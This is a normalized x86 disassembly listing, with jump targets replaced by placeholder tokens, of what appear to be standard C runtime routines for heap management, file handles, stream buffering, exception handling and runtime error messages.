push esi
push eax
call sub_417d15
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_40ff06
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4174f2
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rwxdata ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_40d7f2
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_4174f2
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_4174f2
push 0x1
mov edi eax
call sub_4174f2
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41746c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40ffa2
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_40ff06
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410065
mov eax [ ebp - 0x1c ]
sub_41006f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40fe78
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4100a0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_40d7cc
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_411974
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40f4fc
pop ecx
push eax
call sub_4191cb
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40f4fc
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rwxdata
push esi
call sub_40f4fc
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_40f4fc
sar eax 0x5
push esi
lea edi [ eax * 4 + rwxdata ]
call sub_40f4fc
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_4101d0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_410249
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_4136f0
mov esi eax
inc esi
push esi
call sub_4107e9
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_4192c8
add esp 0xc
jmp r-xdata
sub_4102b9
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_4136f0
mov edi eax
inc edi
push edi
call sub_4107e9
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_4192c8
add esp 0xc
jmp r-xdata
sub_410316
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
cmp edi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
je r-xdata
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_4136f0
mov esi eax
inc esi
push esi
call sub_4107e9
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
push [ ebx + 0x4 ]
push esi
push eax
call sub_4192c8
add esp 0xc
jmp r-xdata
sub_410394
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_410249
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4103da
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_410249
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_410465
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_410371
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_410486
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_410371
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_4104ad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_410371
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_4104d4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_410371
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_41051f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41050f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_41055e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_4196a0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_41057e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_4196a0
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
pop ebp
retn 0x4
sub_41059f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_4196a0
pop ecx
pop ecx
xor ecx ecx
test eax eax
setg cl
mov eax ecx
pop ebp
retn 0x4
sub_4105e2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rwxdata ]
call sub_40e714
push [ rwxdata ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_40e714
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_419728
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_40e699
mov [ esi ] eax
add esi 0x4
push esi
call sub_40e699
pop ecx
mov [ rwxdata ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4134d8
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4134d8
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_40e699
pop ecx
mov [ rwxdata ] eax
sub_41069c
mov edi edi
push esi
push 0x4
push 0x20
call sub_41348c
mov esi eax
push esi
call sub_40e699
add esp 0xc
mov [ rwxdata ] eax
mov [ rwxdata ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4106cd
push 0xc
push r--data
call sub_40e30c
call sub_410a6e
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4105e2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410703
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_410720
push 0xc
push r--data
call sub_40e30c
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rwxdata ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
push 0x4
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_418924
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410766
sub_41076f
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0x1
jne r-xdata
call sub_410f77
push 0x1e
call sub_410da6
push 0xff
call sub_410a56
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_410720
pop ecx
test eax eax
jne r-xdata
push eax
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
pop ebp
retn
inc eax
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
inc esi
pop esi
pop ebp
retn
sub_4107e9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_41090e
pop ecx
call sub_40d7cc
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rwxdata ]
cmp eax 0x1
jne r-xdata
call sub_410f77
push 0x1e
call sub_410da6
push 0xff
call sub_410a56
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_410720
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rwxdata ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rwxdata ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_40d7cc
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_41090e
pop ecx
test eax eax
je r-xdata
call sub_40d7cc
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
sub_4108c2
mov edi edi
push ebp
mov ebp esp
push esi
push 0x4
call sub_4160e9
push [ rwxdata ]
call sub_40e714
push [ ebp + 0x8 ]
mov esi eax
call sub_40e699
push 0x4
mov [ rwxdata ] eax
call sub_415ff7
add esp 0x10
mov eax esi
pop esi
pop ebp
retn
sub_41090e
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call sub_40e714
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_410936
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] rwxdata
sub_410982
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_4197cb
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax rwxdata
jne r-xdata
sub_4109d2
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_410a02
mov edi edi
push ebp
mov ebp esp
call sub_410f77
push [ ebp + 0x8 ]
call sub_410da6
push [ rwxdata ]
call sub_40e714
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_410a2b
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_410a80
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_410a9d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_410ac1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rwxdata ]
cmp eax esi
je r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov [ ecx ] eax
xor eax eax
pop esi
pop ebp
retn
sub_410afd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rwxdata ]
cmp eax esi
je r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov [ ecx ] eax
xor eax eax
pop esi
pop ebp
retn
sub_410b39
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
je r-xdata
call sub_4133eb
push r--data
push r--data
call sub_410a9d
pop ecx
pop ecx
test eax eax
jne r-xdata
push rwxdata
call sub_416ee0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_411664
call sub_410709
mov eax r--data
mov [ esp ] r--data
call sub_410a80
cmp [ rwxdata ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rwxdata ]
pop ecx
xor eax eax
push rwxdata
call sub_416ee0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rwxdata ]
sub_410bbe
push 0x18
push r--data
call sub_40e30c
push 0x8
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rwxdata ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410cd5
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rwxdata ] ebx
mov al [ ebp + 0x10 ]
mov [ rwxdata ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_40e351
retn
mov [ rwxdata ] ebx
push 0x8
call sub_415ff7
pop ecx
push [ ebp + 0x8 ]
call sub_410a56
push r--data
mov eax r--data
call sub_410a80
pop ecx
push [ rwxdata ]
call sub_40e714
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_410a80
pop ecx
push [ rwxdata ]
call sub_40e714
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_40e70b
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_40e714
mov edi eax
call sub_40e70b
mov [ esi ] eax
call edi
push [ rwxdata ]
call sub_40e714
mov edi eax
push [ rwxdata ]
call sub_40e714
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_410d34
mov edi edi
push esi
call sub_40e70b
mov esi eax
push esi
call sub_4108b3
push esi
call sub_416dd8
push esi
call sub_40d5d3
push esi
call sub_419ff2
push esi
call sub_419d5c
push esi
call sub_419860
push esi
call sub_410fb0
push esi
call sub_41984f
push sub_410d00
call sub_40e699
add esp 0x24
mov [ rwxdata ] eax
pop esi
retn
sub_410d82
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40d5e2
add esp 0x14
sub_410da6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_41a293
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rwxdata ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_41a293
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rwxdata ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rwxdata ]
push [ esi ]
call sub_4136f0
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rwxdata
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rwxdata
push esi
push 0x0
mov [ rwxdata ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
push esi
call sub_4136f0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_4136f0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rwxdata
push r--data
sub ecx eax
push ecx
push eax
call sub_41a1de
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rwxdata ]
push ebx
push edi
call sub_41a16a
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_41a001
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
push r--data
push ebx
push edi
call sub_41a16a
add esp 0xc
test eax eax
je r-xdata
sub_410f51
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + rwxdata ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + rwxdata ]
je r-xdata
xor eax eax
pop ebp
retn
sub_410f77
push 0x3
call sub_41a293
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_410da6
push 0xff
call sub_410da6
pop ecx
pop ecx
push 0x3
call sub_41a293
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rwxdata ] 0x1
jne r-xdata
sub_410fb1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
pop ebp
retn
sub_410fe6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_40e924
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rwxdata ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rwxdata ]
mov edi [ rwxdata ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rwxdata ]
mov ebx [ rwxdata ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_411146
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_410fe6
pop ecx
pop ecx
pop ebp
retn
sub_411166
mov edi edi
push esi
push edi
xor edi edi
cmp [ rwxdata ] edi
jne r-xdata
mov esi [ rwxdata ]
test esi esi
jne r-xdata
call sub_412124
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_41a4ff
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_4111c5
cmp [ rwxdata ] 0x0
jne r-xdata
push esi
mov esi [ rwxdata ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_412124
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_41348c
mov edi eax
pop ecx
pop ecx
mov [ rwxdata ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_4136f0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rwxdata ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_4136f0
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rwxdata ]
call sub_40fe78
and [ rwxdata ] 0x0
and [ edi ] 0x0
mov [ rwxdata ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_41348c
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rwxdata ]
call sub_40fe78
and [ rwxdata ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
sub_4112b2
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
